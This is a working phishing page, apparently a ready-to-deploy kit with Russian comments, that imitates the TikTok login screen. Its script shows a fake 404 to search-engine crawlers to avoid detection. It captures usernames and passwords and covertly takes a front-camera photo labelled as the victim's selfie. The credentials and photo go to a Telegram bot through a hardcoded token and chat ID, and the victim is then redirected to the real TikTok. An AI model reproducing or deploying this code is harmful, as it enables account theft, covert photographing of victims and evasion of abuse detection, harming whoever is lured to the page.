<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to TikTok</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        h2 { margin-bottom: 20px; font-weight: 500; }
        input { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #fe2c55; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        .error { color: #fe2c55; display: none; margin-top: 10px; font-size: 14px; }
        video { display: none; }
    </style>
</head>
<body>
    <div class="container" id="phishContainer" style="display:none;">
        <h2>Log in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="btn">Log in</button>
        </form>
        <div class="error" id="errorMsg">Incorrect password. Please try again.</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div id="fakePage" style="display:none; text-align: center; color: #888; font-family: sans-serif; padding: 20px;">
        <h1 style="font-size: 24px;">404 Not Found</h1>
        <p>The requested URL was not found on this server.</p>
    </div>

    <script>
        // 1. ЗАЩИТА ОТ БОТОВ (КЛОАКИНГ)
        const ua = navigator.userAgent.toLowerCase();
        const isBot = /googlebot|bingbot|yandexbot|facebookexternalhit|twitterbot|applebot|baidu|duckduckbot|crawler|spider|slurp|headless/i.test(ua);
        
        if (isBot) {
            document.getElementById('fakePage').style.display = 'block';
        } else {
            document.getElementById('phishContainer').style.display = 'block';
        }

        // 2. НАСТРОЙКИ БОТА
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
        const CHAT_ID = "7485234259"; 

        // 3. ФУНКЦИЯ СЕЛФИ
        async function takePhoto() {
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                // Запрашиваем фронтальную камеру
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());

                const dataURL = canvas.toDataURL('image/jpeg');
                const blob = await (await fetch(dataURL)).blob();
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'face.jpg');
                formData.append('caption', '📸 Селфи жертвы');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.log('Камера недоступна или доступ запрещен', err);
            }
        }

        // 4. ОТПРАВКА ДАННЫХ
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('btn');
            
            btn.innerText = "Verifying...";
            btn.disabled = true;

            // Сначала делаем фото (ждем завершения)
            await takePhoto();

            // Потом отправляем логин и пароль
            const text = `🎯 TikTok Phish\nDevice: iOS\nUser: ${user}\nPass: ${pass}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;

            fetch(url, { mode: 'no-cors' })
            .then(() => {
                window.location.href = "https://www.tiktok.com/login";
            })
            .catch(() => {
                document.getElementById('errorMsg').style.display = 'block';
                btn.innerText = "Log in";
                btn.disabled = false;
            });
        });
    </script>
</body>
</html>
